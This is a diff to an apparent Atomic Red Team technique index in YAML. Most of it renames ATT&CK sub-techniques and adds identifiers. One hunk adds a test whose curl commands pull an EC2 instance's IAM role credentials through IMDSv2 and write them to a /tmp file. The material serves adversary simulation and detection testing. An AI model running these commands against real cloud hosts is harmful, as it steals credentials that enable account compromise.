@@ -1201,7 +1201,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-04-15T20:39:13.971Z'
-      name: Masquerade File Type
+      name: 'Masquerading: Masquerade File Type'
       description: "Adversaries may masquerade malicious payloads as legitimate files
         through changes to the payload's formatting, including the file’s signature,
         extension, icon, and contents. Various file types have a typical standard
@@ -1241,6 +1241,7 @@ stealth:
       - macOS
       - Windows
       x_mitre_version: '2.0'
+      identifier: T1036.008
     atomic_tests: []
   T1564:
     technique:
@@ -19138,6 +19139,7 @@ execution:
       - Windows
       x_mitre_version: '1.1'
       x_mitre_remote_support: false
+      identifier: T1204.004
     atomic_tests: []
   T1648:
     technique:
@@ -28882,7 +28884,7 @@ command-and-control:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:49:18.602Z'
-      name: Bidirectional Communication
+      name: 'Web Service: Bidirectional Communication'
       description: "Adversaries may use an existing, legitimate external Web service
         as a means for sending commands to and receiving output from a compromised
         system over the Web service channel. Compromised systems may leverage popular
@@ -28914,6 +28916,7 @@ command-and-control:
       - Windows
       x_mitre_version: '1.1'
       revoked: false
+      identifier: T1102.002
     atomic_tests: []
   T1573.002:
     technique:
@@ -38051,7 +38054,57 @@ credential-access:
       - IaaS
       x_mitre_version: '1.4'
       identifier: T1552.005
-    atomic_tests: []
+    atomic_tests:
+    - name: AWS - Retrieve EC2 IAM Role Credentials via IMDSv2
+      auto_generated_guid: c9aa1ca4-04df-4623-adac-1f199ca5ce42
+      description: |
+        Simulates an adversary on a compromised EC2 instance abusing the Instance Metadata Service Version 2
+        (IMDSv2) to steal the temporary IAM role credentials assigned to the instance. A session token is first
+        requested with a PUT to `/latest/api/token`, then supplied in the `X-aws-ec2-metadata-token` header to
+        read the instance's IAM role name and retrieve that role's `AccessKeyId`, `SecretAccessKey`, and `Token`
+        from `/latest/meta-data/iam/security-credentials/`. The harvested credentials are written to a file.
+        On a host that is not an EC2 instance the requests to the link-local 169.254.169.254 address time out and
+        no credentials are returned.
+        See: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html
+      supported_platforms:
+      - linux
+      - iaas:aws
+      input_arguments:
+        metadata_endpoint:
+          description: Base URL of the EC2 Instance Metadata Service
+          type: string
+          default: http://169.254.169.254
+        token_ttl:
+          description: TTL in seconds requested for the IMDSv2 session token
+          type: integer
+          default: 21600
+        output_file:
+          description: File the harvested IAM role credentials are written to
+          type: path
+          default: "/tmp/T1552.005_aws_imds_creds.json"
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'curl must be installed.
+
+          '
+        prereq_command: 'if [ -x "$(command -v curl)" ]; then echo "curl is installed";
+          else echo "curl is NOT installed"; exit 1; fi
+
+          '
+        get_prereq_command: |
+          if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y curl; fi
+          if grep -iq "rhel\|fedora\|centos\|rocky\|alma" /usr/lib/os-release; then yum install -y curl; fi
+      executor:
+        command: |
+          token=$(curl -s --connect-timeout 2 -m 5 -X PUT "#{metadata_endpoint}/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: #{token_ttl}")
+          role=$(curl -s --connect-timeout 2 -m 5 -H "X-aws-ec2-metadata-token: $token" "#{metadata_endpoint}/latest/meta-data/iam/security-credentials/")
+          curl -s --connect-timeout 2 -m 5 -H "X-aws-ec2-metadata-token: $token" "#{metadata_endpoint}/latest/meta-data/iam/security-credentials/$role" -o "#{output_file}"
+          if [ -s "#{output_file}" ]; then cat "#{output_file}"; else echo "No IAM credentials returned (host is not an EC2 instance with an attached role)"; fi
+        cleanup_command: 'rm -f "#{output_file}"
+
+          '
+        name: sh
+        elevation_required: false
   T1555.002:
     technique:
       type: attack-pattern
@@ -45186,6 +45239,7 @@ discovery:
       - macOS
       - Windows
       x_mitre_version: '1.0'
+      identifier: T1680
     atomic_tests: []
   T1124:
     technique:
@@ -54173,7 +54227,7 @@ exfiltration:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-04-15T19:58:26.901Z'
-      name: Exfiltration Over Webhook
+      name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
       description: "Adversaries may exfiltrate data to a webhook endpoint rather than
         over their primary command and control channel. Webhooks are simple mechanisms
         for allowing a server to push data over HTTP/S to a client without the need
@@ -54215,6 +54269,7 @@ exfiltration:
       - SaaS
       - Windows
       x_mitre_version: '1.2'
+      identifier: T1567.004
     atomic_tests: []
   T1029:
     technique:
